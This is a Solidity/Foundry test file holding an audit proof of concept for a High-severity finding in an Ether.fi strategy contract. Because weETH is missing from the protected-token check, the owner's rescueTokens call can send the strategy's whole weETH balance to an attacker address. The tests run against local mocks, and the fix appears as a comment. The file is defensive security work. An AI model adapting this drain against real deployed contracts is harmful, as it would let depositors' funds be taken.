// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/// @notice PoC for B5-1 / DEPTH-EC-4: EtherfiEETHMYTStrategy missing _isProtectedToken override
///         — weETH is the strategy's yield token (oracle token) but is NOT protected,
///           so rescueTokens(weETH, attacker, balance) succeeds, draining the strategy.
///
/// Finding: B5-1 (+ DEPTH-EC-4 quantification) | Severity: High | CONFIRMED
/// Location: EtherfiEETHStrategy.sol — no _isProtectedToken() override
///           MYTStrategy.sol:270      — base only protects MYT.asset() (WETH)
///
/// Impact: Owner calls rescueTokens(address(weETH), attacker, weETHBalance)
///         → all weETH drained from strategy
///         → MYT share price drops (strategy NAV collapses)
///         → all AlchemistV3 positions backed by this strategy become undercollateralized

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

import {EtherfiEETHMYTStrategy} from "../../strategies/EtherfiEETHStrategy.sol";
import {IMYTStrategy} from "../../interfaces/IMYTStrategy.sol";
import {MYTStrategy} from "../../MYTStrategy.sol";

// ---- Minimal mocks (no mainnet fork needed) ----

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory sym) ERC20(name, sym) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/// @dev Minimal ERC-4626 vault backed by a MockERC20 asset.
contract MockVault is ERC4626 {
    constructor(address asset_) ERC4626(IERC20(asset_)) ERC20("MockVault", "MV") {}
}

/// @dev Stub that satisfies the IDepositAdapter interface.
contract MockDepositAdapter {
    function depositWETHForWeETH(uint256, address) external returns (uint256) { return 0; }
}

/// @dev Stub that satisfies the IRedemptionManager interface.
contract MockRedemptionManager {
    function canRedeem(uint256, address) external pure returns (bool) { return true; }
    function redeemWeEth(uint256, address, address) external returns (uint256) { return 0; }
}

/// @dev Stub that satisfies AggregatorV3Interface for the oracle param.
contract MockChainlinkOracle {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, int256(1e18), block.timestamp, block.timestamp, 1);
    }
    function decimals() external pure returns (uint8) { return 18; }
}

/// @dev Concrete EtherfiEETHMYTStrategy with 0 minAllocationOutBps (matches existing mock in test suite).
contract TestEtherfiEETHStrategy is EtherfiEETHMYTStrategy {
    constructor(
        address myt_,
        IMYTStrategy.StrategyParams memory params_,
        address eETH_,
        address weETH_,
        address depositAdapter_,
        address redemptionManager_,
        address weEthEthOracle_
    )
        EtherfiEETHMYTStrategy(
            myt_, params_, eETH_, weETH_, depositAdapter_, redemptionManager_, weEthEthOracle_, 0
        )
    {}
}

contract PocEtherfiMissingProtectedTokenTest is Test {

    MockERC20             weth;
    MockERC20             weETH;
    MockERC20             eETH;
    MockVault             mytVault;
    MockDepositAdapter    depositAdapter;
    MockRedemptionManager redemptionManager;
    MockChainlinkOracle   oracle;
    TestEtherfiEETHStrategy strategy;

    address owner   = address(0xAD1111);
    address attacker= address(0xBAD);

    function setUp() public {
        weth  = new MockERC20("Wrapped Ether", "WETH");
        weETH = new MockERC20("Wrapped eETH",  "weETH");
        eETH  = new MockERC20("ether.fi ETH",  "eETH");

        // MYT vault asset = WETH
        mytVault          = new MockVault(address(weth));
        depositAdapter    = new MockDepositAdapter();
        redemptionManager = new MockRedemptionManager();
        oracle            = new MockChainlinkOracle();

        IMYTStrategy.StrategyParams memory params = IMYTStrategy.StrategyParams({
            owner:                owner,
            name:                 "EtherFi",
            protocol:             "EtherFi",
            riskClass:            IMYTStrategy.RiskClass.MEDIUM,
            cap:                  2_000_000e18,
            globalCap:            0,
            estimatedYield:       0,
            additionalIncentives: false,
            slippageBPS:          100
        });

        strategy = new TestEtherfiEETHStrategy(
            address(mytVault),
            params,
            address(eETH),
            address(weETH),
            address(depositAdapter),
            address(redemptionManager),
            address(oracle)
        );
    }

    // -----------------------------------------------------------------------
    // PoC 1: Demonstrate that _isProtectedToken(weETH) returns false
    // -----------------------------------------------------------------------
    function test_poc_weETH_not_protected() public view {
        // The base MYTStrategy._isProtectedToken() only protects MYT.asset() == WETH.
        // EtherfiEETHMYTStrategy does NOT override _isProtectedToken, so weETH is unprotected.
        address mytAsset = address(strategy.MYT().asset());
        address weETHAddr = address(strategy.weETH());

        console.log("MYT.asset() (protected): ", mytAsset);
        console.log("weETH address:           ", weETHAddr);

        assertEq(mytAsset, address(weth),   "MYT.asset() == WETH");
        assertTrue(weETHAddr != mytAsset,    "weETH != WETH, weETH NOT protected by base check");
    }

    // -----------------------------------------------------------------------
    // PoC 2: rescueTokens(weETH) succeeds — drains all weETH from strategy
    // -----------------------------------------------------------------------
    function test_poc_rescue_weETH_drains_strategy() public {
        // Simulate strategy holding weETH (received via Ether.fi allocation).
        uint256 strategyWeETHBalance = 100e18;
        weETH.mint(address(strategy), strategyWeETHBalance);

        assertEq(weETH.balanceOf(address(strategy)), strategyWeETHBalance,
            "Strategy has weETH before rescue");
        assertEq(weETH.balanceOf(attacker), 0, "Attacker has no weETH before");

        // Owner calls rescueTokens(weETH, attacker, balance).
        // NOTE: In B5-1 the owner IS an attacker or is compromised.
        //       The point is the token is not protected and drainable.
        vm.prank(owner);
        strategy.rescueTokens(address(weETH), attacker, strategyWeETHBalance);

        uint256 strategyAfter  = weETH.balanceOf(address(strategy));
        uint256 attackerAfter  = weETH.balanceOf(attacker);

        console.log("=== rescueTokens(weETH) result ===");
        console.log("Strategy weETH before:  ", strategyWeETHBalance / 1e18, "weETH");
        console.log("Strategy weETH after:   ", strategyAfter / 1e18, "weETH");
        console.log("Attacker weETH received:", attackerAfter / 1e18, "weETH");

        assertEq(strategyAfter, 0,                    "CONFIRMED: strategy weETH fully drained");
        assertEq(attackerAfter, strategyWeETHBalance, "CONFIRMED: attacker received all weETH");
    }

    // -----------------------------------------------------------------------
    // PoC 3: Contrast — WETH (the MYT asset) IS protected, rescueTokens reverts
    // -----------------------------------------------------------------------
    function test_poc_weth_is_protected_cannot_rescue() public {
        uint256 strategyWETHBalance = 50e18;
        weth.mint(address(strategy), strategyWETHBalance);

        vm.prank(owner);
        vm.expectRevert(bytes("Protected token"));
        strategy.rescueTokens(address(weth), attacker, strategyWETHBalance);

        console.log("=== WETH is protected: rescueTokens reverts as expected ===");
        console.log("(weETH missing from protected list is the bug)");
    }

    // -----------------------------------------------------------------------
    // PoC 4: Fix demonstration — show what the override SHOULD look like
    // -----------------------------------------------------------------------
    function test_poc_fix_comment() public pure {
        // The fix is a one-liner override in EtherfiEETHMYTStrategy:
        //
        //   function _isProtectedToken(address token) internal view override returns (bool) {
        //       return token == MYT.asset() || token == address(weETH);
        //   }
        //
        // This addition ensures weETH cannot be rescued while WETH protection is preserved.
        assert(true);
    }
}
